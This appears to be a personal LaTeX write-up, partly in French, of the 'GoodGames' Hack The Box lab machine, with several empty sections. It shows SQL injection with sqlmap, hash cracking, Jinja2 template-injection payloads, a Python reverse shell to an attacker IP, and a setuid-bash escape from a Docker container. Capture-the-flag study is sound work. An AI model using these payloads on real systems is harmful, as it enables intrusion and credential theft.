\chapter{GoodGames}
\begin{itemize}
    \item {\bf technics}: sqli, ssti, docker privesc 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.11.130
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 04:26 CEST
Nmap scan report for 10.10.11.130
Host is up (0.046s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

\end{verbatim}

\subsubsection{http}

\begin{verbatim}
lmap -r /tmp/login.req --batch

---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=a@yahoo.com' AND (SELECT 4396 FROM (SELECT(SLEEP(5)))Ebjj) AND 'MzIe'='MzIe&password=a
---

$ sqlmap -r /tmp/login.req --batch --schema
$ sqlmap -r /tmp/login.req --batch -T user --dump

Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+

$ echo '2b22337f218b2d82dfc3b6f77e7cb8ec' |hashid
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt admin.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (?)
1g 0:00:00:00 DONE (2022-10-24 05:05) 2.564g/s 8913Kp/s 8913Kc/s 8913KC/s superare1000..super_gronda
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

\end{verbatim}

dans le dashbord on se relog mais avec \verb+admin / superadministrator+.

Il y a du ssti (jinja2) dans la modification du profile.
\begin{verbatim}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
\end{verbatim}



\begin{verbatim}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

uid=0(root) gid=0(root) groups=0(root)
\end{verbatim}

\begin{verbatim}
{{ namespace.__init__.__globals__.os.popen("python3 -c 'import
            socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.5\",5555));os.dup2(s.fileno(),0);
            os.dup2(s.fileno(),1);
            os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",
\"-i\"]);'").read() }}

\end{verbatim}

\begin{verbatim}
\end{verbatim}

\subsection{Foothold}
\subsubsection{root in container}
Bon on doit être dans un container
\begin{verbatim}
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro

5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
\end{verbatim}


\begin{verbatim}
# ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
# script /dev/null -c bash
Script started, file is /dev/null
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password:
augustus@GoodGames:~$ ls
ls
user.txt
augustus@GoodGames:~$ cp /bin/bash .
cp /bin/bash .
augustus@GoodGames:~$ ls
ls
bash  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod +s bash
chmod +s bash
augustus@GoodGames:~$ ls -l
ls -l
total 1212
-rwsr-sr-x 1 root root     1234376 Oct 24 07:20 bash
-rw-r----- 1 root augustus      33 Oct 24 03:26 user.txt
augustus@GoodGames:~$ ./bash -p
./bash -p
bash-5.1# id
id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)

\end{verbatim}



\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


